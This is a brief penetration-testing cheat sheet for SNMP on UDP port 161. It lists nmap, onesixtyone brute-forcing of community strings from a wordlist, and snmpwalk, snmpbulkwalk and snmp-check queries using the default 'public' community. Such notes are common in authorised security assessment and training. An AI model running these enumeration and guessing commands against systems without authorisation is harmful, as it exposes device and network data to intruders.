SNMP — UDP 161
++++++++++++++++++++++++++++++++++++++++
nmap -sU -p161 --script snmp-info <ip_address>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <ip_address>   # find community string
snmpwalk -v2c -c public <ip_address>
snmpbulkwalk -v2c -c public <ip_address> .1   # faster full walk
snmp-check <ip_address> -c public
